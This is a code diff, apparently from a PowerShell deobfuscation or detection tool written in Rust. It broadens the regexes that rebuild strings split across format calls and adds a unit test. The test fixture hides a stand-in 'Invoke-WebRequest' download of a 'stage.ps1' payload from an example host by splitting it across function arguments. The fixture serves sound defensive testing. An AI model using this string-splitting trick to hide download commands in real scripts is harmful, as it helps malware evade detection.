@@ -1101,7 +1101,7 @@ static PS_LITERAL_STRING_JOIN_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static PS_LITERAL_FORMAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)(?:\breturn\s+)?((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*-f\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)"#,
+        r#"(?is)(?:\breturn\s+)?((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*-f\s*(?:@?\(\s*)?((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*(?:\))?"#,
     )
     .expect("ps literal format extractor body regex")
 });
@@ -1109,7 +1109,7 @@ static PS_LITERAL_FORMAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static PS_LITERAL_STRING_FORMAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Format\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*,\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Format\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*,\s*(?:@?\(\s*)?((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*(?:\))?\s*\)"#,
     )
     .expect("ps literal string format extractor body regex")
 });
@@ -10349,6 +10349,23 @@ Format-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps
                 "'Invoke-WebRequest -Uri https://ps-format-named-extractor.example/stage.ps1'"
             ),
             "named-argument format extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_array_format_extractor_named_args_call_is_rewritten() {
+        let text = r#"function Format-Text($left,$middle,$right) {
+  return '{0}{1}{2}' -f @($left,$middle,$right)
+}
+Format-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-array-format-named' -middle '-extractor'"#;
+
+        let out = expand_literal_concat_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-array-format-named-extractor.example/stage.ps1'"
+            ),
+            "named-argument array format extractor call was not rewritten:\n{out}"
         );
     }
 
